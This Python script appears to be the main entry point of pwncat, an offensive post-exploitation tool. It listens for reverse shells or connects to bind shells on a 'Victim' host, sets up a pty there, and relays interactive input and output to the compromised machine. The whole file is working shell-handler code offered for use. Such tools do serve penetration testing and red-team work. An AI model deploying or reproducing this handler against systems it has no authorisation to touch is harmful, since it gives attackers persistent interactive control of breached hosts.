#!/usr/bin/env python3
import argparse
import logging
import selectors
import socket
import sys

from sqlalchemy.exc import InvalidRequestError

import pwncat
from pwncat.remote import Victim
from pwncat import util


def main():

    # Default log-level is "INFO"
    logging.getLogger().setLevel(logging.INFO)

    parser = argparse.ArgumentParser(prog="pwncat")
    mutex_group = parser.add_mutually_exclusive_group(required=True)
    mutex_group.add_argument(
        "--reverse",
        "-r",
        action="store_const",
        dest="type",
        const="reverse",
        help="Listen on the specified port for connections from a remote host",
    )
    mutex_group.add_argument(
        "--bind",
        "-b",
        action="store_const",
        dest="type",
        const="bind",
        help="Connect to a remote host",
    )
    parser.add_argument(
        "--host",
        "-H",
        type=str,
        help=(
            "Bind address for reverse connections. Remote host for bind connections (default: 0.0.0.0)"
        ),
        default="0.0.0.0",
    )
    parser.add_argument(
        "--port",
        "-p",
        type=int,
        help="Bind port for reverse connections. Remote port for bind connections",
        required=True,
    )
    parser.add_argument(
        "--method",
        "-m",
        choices=[*Victim.OPEN_METHODS.keys()],
        help="Method to create a pty on the remote host (default: script)",
        default="script",
    )
    parser.add_argument("--config", "-c", help="Configuration script", default=None)
    args = parser.parse_args()

    # Build the victim object
    pwncat.victim = Victim(args.config)

    # Run the configuration script
    if args.config:
        with open(args.config, "r") as filp:
            config_script = filp.read()
        pwncat.victim.command_parser.eval(config_script, args.config)

    if args.type == "reverse":
        # Listen on a socket for connections
        util.info(f"binding to {args.host}:{args.port}", overlay=True)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((args.host, args.port))
        # After the first connection, drop further attempts
        server.listen(1)

        # Wait for a single connection
        try:
            (client, address) = server.accept()
        except KeyboardInterrupt:
            util.warn(f"aborting listener...")
            sys.exit(0)
    elif args.type == "bind":
        util.info(f"connecting to {args.host}:{args.port}", overlay=True)
        # client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # client.connect((args.host, args.port))
        client = socket.create_connection((args.host, args.port))
        address = (args.host, args.port)
    else:
        parser.error("must specify a valid connection type!")
        sys.exit(1)

    util.info(f"connection to {address[0]}:{address[1]} established", overlay=True)

    # Connect and initialize the remote victim
    pwncat.victim.connect(client)

    # Setup the selector to wait for data asynchronously from both streams
    selector = selectors.DefaultSelector()
    selector.register(sys.stdin, selectors.EVENT_READ, None)
    selector.register(client, selectors.EVENT_READ, "read")

    # Initialize our state
    done = False

    try:
        while not done:
            for k, _ in selector.select():
                if k.fileobj is sys.stdin:
                    data = sys.stdin.buffer.read(8)
                    pwncat.victim.process_input(data)
                else:
                    data = pwncat.victim.recv()
                    if data is None or len(data) == 0:
                        done = True
                        break
                    sys.stdout.buffer.write(data)
                    sys.stdout.flush()
    except ConnectionResetError:
        pwncat.victim.restore_local_term()
        util.warn("connection reset by remote host")
    finally:
        # Restore the shell
        pwncat.victim.restore_local_term()
        try:
            # Make sure everything was committed
            pwncat.victim.session.commit()
        except InvalidRequestError:
            pass
        util.success("local terminal restored")


if __name__ == "__main__":
    main()
    sys.exit(0)
